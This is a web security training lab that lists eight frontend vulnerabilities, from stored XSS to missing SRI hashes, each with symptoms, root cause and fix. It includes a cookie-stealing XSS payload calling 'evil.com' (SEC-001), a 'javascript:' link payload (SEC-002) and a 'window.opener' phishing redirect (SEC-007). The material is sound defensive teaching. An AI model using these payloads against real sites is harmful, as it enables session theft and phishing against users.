# Module 16.5 — Security Engineering Issues Lab (SEC-001 to SEC-008)

This lab contains practical, reproducible failure modes, root-cause analyses, DevTools inspection workflows, and permanent fixes for enterprise web security.

---

## 🔬 SEC-001: Unsanitized Markdown Rendering Stored XSS Exploit

- **Severity:** 🔴 Critical (Remote Code Execution in Browser)
- **Environment:** Production (User Comments / Product Descriptions)
- **Symptoms:** Attacker posts a comment containing `<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">`. When other users view the thread, their browser executes the script.
- **Root Cause:** Raw markdown was converted to HTML and injected directly via `dangerouslySetInnerHTML` without sanitization.
- **Fix:** Pipe all HTML through `DOMPurify.sanitize(html)` before rendering.

---

## 🔬 SEC-002: `javascript:` Protocol Execution in User Profile Website Link

- **Severity:** 🔴 Critical
- **Environment:** Production
- **Symptoms:** Attacker sets their website URL to `javascript:stealTokens()`. When an admin clicks "Visit User Website", the malicious script executes under the admin's session.
- **Root Cause:** React does not sanitize `href` attributes against `javascript:` pseudo-protocols.
- **Fix:** Validate URLs against allowed protocols (`http:`, `https:`) using `<SafeLink />` component.

---

## 🔬 SEC-003: CSRF Token Missing on State-Changing API Request

- **Severity:** 🔴 Critical
- **Environment:** Production (Cookie Auth)
- **Symptoms:** All `POST /api/transfer` requests from React client fail with `403 Forbidden: Invalid CSRF Token`.
- **Root Cause:** Spring Security enabled CSRF protection, but Axios client failed to read `XSRF-TOKEN` cookie or send `X-XSRF-TOKEN` header.
- **Fix:** Configure `xsrfCookieName: 'XSRF-TOKEN'` and `xsrfHeaderName: 'X-XSRF-TOKEN'` in Axios instance.

---

## 🔬 SEC-004: Overly Strict CSP Header Blocking Sentry Telemetry

- **Severity:** 🔴 High (Loss of Observability)
- **Environment:** Production
- **Symptoms:** Frontend errors are completely missing from Sentry dashboard; browser console logs `Refused to connect to 'https://o1234.ingest.sentry.io' because it violates the following Content Security Policy directive: "connect-src 'self'"`.
- **Root Cause:** CSP `connect-src` directive did not whitelist Sentry's ingest domain.
- **Fix:** Add `https://*.sentry.io` or `https://*.ingest.sentry.io` to `connect-src` in Nginx CSP config.

---

## 🔬 SEC-005: Clickjacking Vulnerability Due to Missing `frame-ancestors`

- **Severity:** 🔴 High
- **Environment:** Production
- **Symptoms:** An attacker embeds your checkout page in a transparent iframe on `attacker.com` and tricks users into clicking "Transfer Funds" while thinking they are playing a game.
- **Root Cause:** Missing `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY`.
- **Fix:** Add `frame-ancestors 'none'` to CSP and `X-Frame-Options: DENY` header in Nginx / Spring Security.

---

## 🔬 SEC-006: Compromised Transitive npm Dependency Exfiltrating Form Data

- **Severity:** 🔴 Critical (Data Breach)
- **Environment:** Production Bundle
- **Symptoms:** A minor patch release of a popular formatting utility (`color-convert` or `event-stream`) added a payload that reads password inputs and POSTs them to an external IP.
- **Root Cause:** Malicious supply chain attack merged via unlocked caret `^` dependencies without lockfile verification.
- **Fix:** Run `npm audit --audit-level=high` in CI/CD, lock dependencies strictly, and use Socket.dev security scanning.

---

## 🔬 SEC-007: Tab-Napping Attack via External Link

- **Severity:** 🟡 Medium
- **Environment:** Production
- **Symptoms:** User clicks an external link `<a href="https://external.com" target="_blank">`. The external page runs `window.opener.location = 'https://fake-login.com'`, presenting the user with a phishing screen when they return to the original tab.
- **Root Cause:** Missing `rel="noopener noreferrer"` on `target="_blank"` links.
- **Fix:** Enforce `rel="noopener noreferrer"` on all external links via ESLint `react/jsx-no-target-blank` rule.

---

## 🔬 SEC-008: Missing SRI Hash on Third-Party CDN Script

- **Severity:** 🔴 Critical
- **Environment:** Production
- **Symptoms:** A third-party CDN hosting your chat widget is hijacked via DNS poisoning, serving malicious JavaScript to all website visitors.
- **Root Cause:** CDN script loaded with `<script src="https://cdn.com/chat.js">` without Subresource Integrity verification.
- **Fix:** Add `integrity="sha384-..."` and `crossorigin="anonymous"` to all third-party script tags.
